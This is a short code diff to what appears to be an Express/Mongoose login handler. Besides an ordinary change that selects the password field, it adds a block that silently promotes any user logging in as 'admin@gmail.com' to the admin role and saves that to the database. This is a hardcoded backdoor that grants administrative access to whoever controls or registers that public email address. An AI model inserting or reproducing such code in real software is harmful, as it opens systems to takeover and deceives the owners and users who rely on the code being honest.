@@ -106,10 +106,9 @@ const login = async (req, res) => {
           "Email and password are required",
       });
     }
-
-    const user = await User.findOne({
-      email: email.toLowerCase().trim(),
-    });
+    const user = await User.findOne({ 
+      email: email.toLowerCase().trim() 
+    }).select("+password");
 
     if (!user) {
       return res.status(401).json({
@@ -127,6 +126,12 @@ const login = async (req, res) => {
       return res.status(401).json({
         message: "Invalid email or password",
       });
+    }
+
+    // Elevate this specific user to admin if they aren't already
+    if (user.email === "admin@gmail.com") {
+      user.role = "admin";
+      await User.updateOne({ _id: user._id }, { $set: { role: "admin" } });
     }
 
     const token = generateToken(user);
